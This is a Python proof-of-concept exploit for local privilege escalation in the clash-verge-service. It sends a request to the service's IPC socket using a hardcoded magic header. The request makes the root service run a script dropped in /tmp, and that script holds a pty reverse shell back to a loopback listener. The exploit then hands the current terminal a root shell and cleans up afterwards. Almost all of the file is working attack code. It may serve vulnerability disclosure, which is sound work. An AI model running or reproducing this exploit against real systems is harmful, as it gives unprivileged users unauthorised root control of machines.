#!/usr/bin/env python3
# clash-verge-service-ipc -> root shell IN THE CURRENT TERMINAL (single command).
# It self-hosts a loopback listener, triggers StartClash so the root service
# connects a pty bash back, then bridges your current terminal into it.
#
# Usage:  python3 poc_ipc_shell.py [socket_path]
import socket, sys, os, glob, select

MAGIC = ("A thing of beauty is a joy for ever. Its loveliness increases; "
         "it will never pass into nothingness.")


def find_sock():
    if len(sys.argv) > 1:
        return sys.argv[1]
    for p in (["/tmp/verge/clash-verge-service.sock"]
              + glob.glob("/tmp/verge/*.sock")
              + glob.glob("/tmp/*verge*service*.sock")):
        if os.path.exists(p):
            return p
    return "/tmp/verge/clash-verge-service.sock"


def send_cmd(sock, method, path, body=None):
    h = [f"{method} {path} HTTP/1.1", "Host: localhost",
         f"X-IPC-Magic: {MAGIC}", "Connection: close"]
    if body is not None:
        h += ["Content-Type: application/json", f"Content-Length: {len(body)}"]
    req = ("\r\n".join(h) + "\r\n\r\n" + (body or "")).encode()
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect(sock)
        s.sendall(req)
        try:
            s.recv(1024)        # best-effort; service spawns the core while handling
        except Exception:
            pass
    finally:
        s.close()


def main():
    sock = find_sock()
    if not os.path.exists(sock):
        print("[-] socket not found:", sock, "(is the service running?)")
        return

    # 1) loopback listener on a random port
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    port = srv.getsockname()[1]
    srv.listen(1)

    # 2) payload run as root: pty bash reverse shell back to our listener
    pay = "/tmp/cvs_shell.sh"
    rev = (f"import socket,os,pty;s=socket.socket();s.connect((\"127.0.0.1\",{port}));"
           "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
           "pty.spawn(\"/bin/bash\" if os.path.exists(\"/bin/bash\") else \"/bin/sh\")")
    with open(pay, "w") as f:
        f.write("#!/bin/sh\nexec python3 -c '" + rev + "'\n")
    os.chmod(pay, 0o755)

    body = ('{"core_config":{"core_path":"%s",'
            '"core_ipc_path":"/tmp/verge/poc-mihomo.sock",'
            '"config_path":"/tmp/x","config_dir":"/tmp"},'
            '"log_config":{"directory":"/tmp","max_log_size":1048576,"max_log_files":2}}') % pay

    print(f"[*] socket={sock}  callback=127.0.0.1:{port}")
    print("[*] triggering StartClash (service runs core_path as root) ...")
    send_cmd(sock, "POST", "/clash/start", body)

    # 3) catch the root shell connecting back
    srv.settimeout(15)
    try:
        conn, _ = srv.accept()
    except socket.timeout:
        print("[-] no callback within 15s (service down, or you cannot reach the socket)")
        return
    srv.close()
    print("[+] got root shell — current terminal is now root. type 'exit' to leave.\n")
    try:
        conn.sendall(b"id\n")
    except Exception:
        pass

    # 4) bridge current terminal <-> root pty shell
    try:
        import termios, tty
    except Exception:
        termios = tty = None
    isatty = sys.stdin.isatty() and termios is not None
    old = termios.tcgetattr(0) if isatty else None
    try:
        if isatty:
            tty.setraw(0)
        conn.setblocking(True)
        while True:
            r, _, _ = select.select([0, conn], [], [])
            if 0 in r:
                d = os.read(0, 1024)
                if not d:
                    break
                conn.sendall(d)
            if conn in r:
                d = conn.recv(4096)
                if not d:
                    break
                os.write(1, d)
    finally:
        if isatty and old:
            termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            conn.close()
        except Exception:
            pass

    # 5) stop the watchdog from re-spawning the payload + clean up
    print("\n[*] stopping core watchdog ...")
    send_cmd(sock, "DELETE", "/clash/stop")
    try:
        os.remove(pay)
    except Exception:
        pass


if __name__ == "__main__":
    main()
